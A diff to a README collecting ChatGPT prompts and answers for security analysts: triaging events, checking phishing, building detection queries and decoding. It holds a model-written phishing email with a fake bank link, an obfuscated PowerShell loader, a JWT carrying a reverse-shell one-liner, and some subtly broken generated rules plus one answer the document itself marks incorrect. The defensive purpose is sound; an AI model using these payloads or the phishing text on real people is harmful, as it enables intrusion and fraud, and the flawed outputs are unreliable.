@@ -1,6 +1,6 @@
 # *-chatgpt-ai-examples
 
-***1. Suspicious Event Unpacking and Explanation***
+<h4>1. Suspicious Event Unpacking and Explanation</h4>
 
 `OpenAI prompt: please analyze the suspicious event below and explain what's going on.`
 
@@ -11,3 +11,398 @@
 `OpenAI prompt: analyze the parameters and the powershell script, decode the base64 argument, and explain what the script does.`
 
 *OpenAI Response: The parameters of the Powershell script indicate that the script is attempting to bypass security restrictions and execute arbitrary code. The base64 argument is likely a payload containing malicious code. After decoding the base64 argument, it appears that the script is attempting to download a file from a remote source and then execute it. This type of attack is often used to download and execute malware on the system.*
+
+<h4>2. Creating phishing email</h4>
+
+`OpenAI prompt:` 
+> Write an email that requires immediate action with a link https://www.fakebank.com/account-login?ref=12345&verify=true
+
+`OpenAI Response: `
+>Subject: Urgent - Action Required
+>
+>Dear [Recipient],
+>
+>We need your immediate action to ensure your account security.
+>
+>Please click on the link below to verify your account and ensure the security of your account at Fake Bank:
+>
+>https://www.fakebank.com/account-login?ref=12345&verify=true
+>
+>Please complete this verification process as soon as possible.
+>
+>Thank you for your prompt attention to this matter.
+>
+>Sincerely,
+>[Your Name]
+
+<h4>3. Check if email is phishing</h4>
+`OpenAI prompt:` 
+> Do you think this email looks like phishing? Answer in 1 word
+> Subject: Urgent - Action Required
+> 
+> Dear [Recipient],
+> 
+> We need your immediate action to ensure your account security.
+> 
+> Please click on the link below to verify your account and ensure the security of your account at Fake Bank:
+> 
+> https://www.fakebank.com/account-login?ref=12345&verify=true
+> 
+> Please complete this verification process as soon as possible.
+> 
+> Thank you for your prompt attention to this matter.
+> 
+> Sincerely,
+> [Your Name]
+
+`OpenAI Response: `
+> Yes
+> 
+<h4>4. Building Spotter Query for IOCs</h4>
+
+`OpenAI prompt:` 
+> This is an example of a spotter query:
+> index=activity AND rg_functionality="Web Proxy" AND destinationaddress NOT NULL AND destinationaddress IN ("163.123.142.210","185.106.94.146",> "45.142.122.11","51.255.171.23")
+> 
+> Please build a spotter query for the following IOCs:
+> - 192.185.129.139
+> - 76.25.142.196
+
+`OpenAI Response:` 
+> index=activity AND rg_functionality="Web Proxy" AND destinationaddress NOT NULL AND destinationaddress IN ("192.185.129.139","76.25.142.196")
+
+<h4>5. Building Spotter Query from YAML</h4>
+
+`OpenAI prompt:` 
+> This is an example of a spotter query:
+> 
+> rg_functionality = “Endpoint Management Systems” AND (deviceaction = “Process Create” OR deviceaction = “ProcessCreate” OR deviceaction = “Process Create (rule: ProcessCreate)” OR deviceaction = “ProcessRollup2” OR deviceaction = “SyntheticProcessRollUp2” OR deviceaction = “WmiCreateProcess” OR deviceaction = “Trace Executed Process” OR deviceaction = “Process” OR deviceaction = “Childproc” OR deviceaction = “Procstart” OR deviceaction = “Process Activity: Launched”) AND destinationprocessname = “cmd.exe” AND resourcecustomfield1 CONTAINS “-decode” AND resourcecustomfield1 CONTAINS “.jpg.lnk”
+> 
+> Please build a spotter query for the following yaml:
+```
+title: JXA In-memory Execution Via OSAScript
+id: f1408a58-0e94-4165-b80a-da9f96cf6fc3
+related:
+    - id: 1bc2e6c5-0885-472b-bed6-be5ea8eace55
+      type: derived
+status: experimental
+description: Detects possible malicious execution of JXA in-memory via OSAScript
+references:
+    - https://redcanary.com/blog/applescript/
+author: Sohan G (D4rkCiph3r)
+date: 2023/01/31
+tags:
+    - attack.t1059.002
+    - attack.t1059.007
+    - attack.execution
+logsource:
+    product: macos
+    category: process_creation
+detection:
+    selection_main:
+        CommandLine|contains|all:
+            - 'osascript'
+            - ' -e '
+            - 'eval'
+            - 'NSData.dataWithContentsOfURL'
+    selection_js:
+        - CommandLine|contains|all:
+            - ' -l '
+            - 'JavaScript'
+        - CommandLine|contains: '.js'
+    condition: all of selection_*
+fields:
+    - CommandLine
+falsepositives:
+    - Unknown
+level: high
+```
+
+
+`OpenAI Response:`
+>  rg_functionality = "Process Create" AND (deviceaction = "ProcessCreate" OR deviceaction = "ProcessCreate (rule: ProcessCreate)" OR deviceaction = "ProcessRollup2" OR deviceaction = "SyntheticProcessRollUp2" OR deviceaction = "WmiCreateProcess" OR deviceaction = "Trace Executed Process" OR deviceaction = "Process" OR deviceaction = "Childproc" OR deviceaction = "Procstart" OR deviceaction = "Process Activity: Launched") AND CommandLine CONTAINS "osascript" AND CommandLine CONTAINS " -e " AND CommandLine CONTAINS "eval" AND CommandLine CONTAINS "NSData.dataWithContentsOfURL" AND (CommandLine CONTAINS " -l " AND CommandLine CONTAINS "JavaScript") OR CommandLine CONTAINS ".js"
+
+<h4>6. Building STR Omega from Spotter query</h4>
+
+`OpenAI prompt:`
+> This is an example of an STR Omega yaml structure
+```
+# omega - compound/second order attack behavior detection by Securonix
+title: System Information Discovery WMIC Command LineAnalytics
+uuid: EDR-SYM315-RUN
+tldr: An adversary may attempt to get detailed information about the operating system and hardware.
+
+reference: https://www.varonis.com/blog/alphv-blackcat-ransomware
+
+tags:
+  - attack.discovery
+  - attack.t1082
+  - BlackCat
+  - Ransomware as a Service (RaaS) 
+
+omega_securonix_ueba:
+    snpr_policy:
+        violator: Activityaccount
+        category: ALERT
+        threatname: Suspicious Access Pattern
+        functionality: Endpoint Management Systems 
+
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: wmic.exe
+        CommandLine|contains: get
+    filter:
+        CommandLine|contains: 
+            - MACAddress
+            - UUID
+            - Win32_videocontroller
+            - ComputerSystem
+            - OS
+            - logicaldisk
+    condition: selection and filter
+```
+> Please build STR Omega for the following  query:
+>rg_functionality = “Endpoint Management Systems” AND (deviceaction = “Process Create” OR deviceaction = “ProcessCreate” OR deviceaction = “Process Create (rule: ProcessCreate)” OR deviceaction = “ProcessRollup2” OR deviceaction = “SyntheticProcessRollUp2” OR deviceaction = “WmiCreateProcess” OR deviceaction = “Trace Executed Process” OR deviceaction = “Process” OR deviceaction = “Childproc” OR deviceaction = “Procstart” OR deviceaction = “Process Activity: Launched”) AND destinationprocessname = “certutil.exe” AND resourcecustomfield1 CONTAINS “-decode” AND resourcecustomfield1 CONTAINS “Cortana” AND resourcecustomfield1 CONTAINS “.rar”`
+
+`OpenAI Response:`
+```
+title: Certutil.exe Command Line Activity
+uuid: EDR-SYM315-CERTUTIL
+tldr: An adversary may use certutil.exe command line to decode and extract files from a .rar file.
+
+reference: https://attack.mitre.org/techniques/T1122/
+
+tags:
+  - attack.t1122
+  - attack.execution
+
+omega_securonix_ueba:
+    snpr_policy:
+        violator: Activityaccount
+        category: ALERT
+        threatname: Suspicious Access Pattern
+        functionality: Endpoint Management Systems 
+
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: certutil.exe
+        CommandLine|contains: -decode
+        CommandLine|contains: Cortana
+        CommandLine|contains: .rar
+    condition: selection 
+    filter:
+        CommandLine|contains:
+            - decode
+            - Cortana
+            - .rar *
+```
+<h4>7. Updating STR Omega with filter values</h4>
+
+`OpenAI prompt:`
+>  This is an example of an STR Omega yaml structure
+```
+# omega - compound/second order attack behavior detection by Securonix
+title: Potential Formbook Infostealer Activity Process Self-Deleting Analytic
+uuid: EDR-SYM269-RUN
+tldr: Detect Formbook info stealer that uses self-deleting action
+
+tags:
+    - Formbook RAT
+    
+omega_securonix_ueba:
+    snpr_policy:
+        violator: Activityaccount
+        category: ALERT
+        threatname: Suspicious Access Pattern
+        functionality: Endpoint Management Systems 
+
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        ParentImage|endswith:
+            - services.exe
+            - chkdsk.exe
+            - cmstp.exe
+        Image|endswith: cmd.exe
+        CommandLine|contains|all:
+            - ' /c '
+            - ' del '
+    condition: selection
+```
+>
+>Print updated STR Omega with a filter key "filter" with an object  in the detection  section with  CommandLine containing any of the keywords:
+> - lab.local
+> - 127.0.0.1
+> under the detection key and modify the condition with a filter keyword to exclude false positives`
+>
+`OpenAI Response:`
+```
+title: Potential Formbook Infostealer Activity Process Self-Deleting Analytic
+uuid: EDR-SYM269-RUN
+tldr: Detect Formbook info stealer that uses self-deleting action
+
+tags:
+    - Formbook RAT
+    
+omega_securonix_ueba:
+    snpr_policy:
+        violator: Activityaccount
+        category: ALERT
+        threatname: Suspicious Access Pattern
+        functionality: Endpoint Management Systems 
+
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        ParentImage|endswith:
+            - services.exe
+            - chkdsk.exe
+            - cmstp.exe
+        Image|endswith: cmd.exe
+        CommandLine|contains|all:
+            - ' /c '
+            - ' del '
+        filter:
+            CommandLine|contains|any:
+                - lab.local
+                - 127.0.0.1
+    condition: selection && !filter *
+```
+
+
+<h4>8. Combining STR Omegas</h4>
+
+`OpenAI prompt:` 
+> This is  STR Omega with UUID EDR-SYM158-RUN
+```
+# omega - compound/second order attack behavior detection by Securonix
+title: Possible Hafnium Group Activity Reverse Shell Connection CommandLine Analytic
+uuid: EDR-SYM158-RUN
+
+references:
+  - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
+  - https://blog.truesec.com/2021/03/07/exchange-zero-day-proxylogon-and-hafnium/
+
+omega_securonix_ueba:
+    snpr_policy:
+        violator: Activityaccount
+        category: 'ALERT'
+        threatname: 'Suspicious Access Pattern'
+        functionality: 'Endpoint Management Systems'
+
+logsource:
+  category: process_creation
+  product: windows
+
+detection:
+  selection:
+    CommandLine|contains:
+      - "system.net.sockets.tcpclient"
+  condition: selection
+```
+>
+>This is  STR Omega with UUID  EDR-SYM159-RUN
+>
+```
+title: Installed AntiVirus Products Enumeration Analytic
+uuid: EDR-SYM159-RUN
+
+omega_securonix_ueba:
+    snpr_policy:
+        violator: Resources
+        category: ALERT
+        threatname: Windows Management Instrumentation
+        functionality: Endpoint Management Systems
+
+logsource:
+  category: process_creation
+  product: windows
+
+detection:
+  selection:  
+    CommandLine|contains: 
+      - wmic
+      - SecurityCenter2
+      - Path 
+      - AntiVirusProduct 
+      - Get
+  condition: selection
+```
+>Please combine them into one STR Omega with UUID EDR-SYM777-RUN.`
+>
+`OpenAI Response:`
+```
+title: Possible Hafnium Group Activity Reverse Shell Connection and Installed AntiVirus Products Enumeration Analytic
+uuid: EDR-SYM777-RUN
+
+omega_securonix_ueba:
+    snpr_policy:
+        violator: Activityaccount, Resources
+        category: 'ALERT'
+        threatname: 'Suspicious Access Pattern, Windows Management Instrumentation'
+        functionality: 'Endpoint Management Systems'
+
+logsource:
+  category: process_creation
+  product: windows
+
+detection:
+  selection:
+    CommandLine|contains:
+      - "system.net.sockets.tcpclient"
+      - wmic
+      - SecurityCenter2
+      - Path 
+      - AntiVirusProduct 
+      - Get
+  condition: selection *
+```
+
+<h4>9. Incorrect response</h4>
+
+`OpenAI prompt:` 
+> Extract final payload  
+```
+. ( $ShellId[1]+$sHellId[13]+‘x’)( nEw-OBjEct sySTeM.IO.ComPressIon.DEFLatEsTREAm([IO.mEmOrySTrEAM][conVerT]::fromBASe64sTRING( ‘TZFRa8IwFIXf9ysupRsJs6FuOJhlwixuE0Ytq+CD+BDbi+1s02IiWtT/vqa1nRCSSzjnnu8mRX7AnYwxTcHycl9vYgrWAr6SKEIB1uSIIYzLgksJlptnGRcReHiwZutfDBUEpVSYMQ8VC/Jwi0qyueu7aYJCEaNvs3YZvVfb7lPHlGqHPIM3MMNaxT5RBfUdoc5yXSpcrlamPmUlshl7GQyeB+f7k31xDnGSIiFmou1NI/aDPCKNvgd2D5qSfaPYqJhSsASCTU+OGXHFKx+5obfmZYEez7CdY45Hxd4DdzqdiDCPErGhV76qbFN0SKInQRGtebjVTRM8QpPwNHrowxlme2U1NriRPkFN3hofwfADMKqTFIeIMp+rWF+OwLh6qkDdfqk0GF6ZVsNhzVizjTUT+U/onpgtdolC0vWpuLu6fZ5O+5HuZUzoxWl/xU1ziYTe/QE=’ ), [io.COMPressiOn.CoMPRessIonmODE]::DEcOMpREsS) fOReaCh-ObjEcT {nEw-OBjEct Io.streAmREADEr($_,[System.TexT.encodinG]::AsCIi)} fOreach-ObJecT{ $_.reADTOeNd() } )  
+```
+
+`OpenAI Response:`
+> The final payload is:  
+```
+Hello World! This is a test of the compression and decompression of a string
+```
+
+<h4>10. Decode JTW Token</h4>
+
+`OpenAI prompt:` 
+> Please decode JWT token payload ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMC44LjIuNDUiLCJuYW1lIjoic2ggLWkgPiYgL2Rldi91ZHAvMTAuOC4yLjQ1LzQyNDIgMD4mMSIsImlhdCI6MTUxNjIzOTEyMn0.AmnVg7KnvwVxR3SOdR0y6U9mp9F2MwU6U3emOATM8WA```
+
+`OpenAI Response:`
+> The decoded payload will be - 
+```
+
+{
+  "sub": "10.8.2.45",
+  "name": "sh -i >& /dev/udp/10.8.2.45/4242 0>&1",
+  "iat": 1516239122
+}
+```
+
+<h4>11. Info about port</h4>
+
+`OpenAI prompt:` 
+> What program use port ```1433```?
+
+`OpenAI Response:`
+> Microsoft SQL Server is a program that commonly uses port 1433.
+
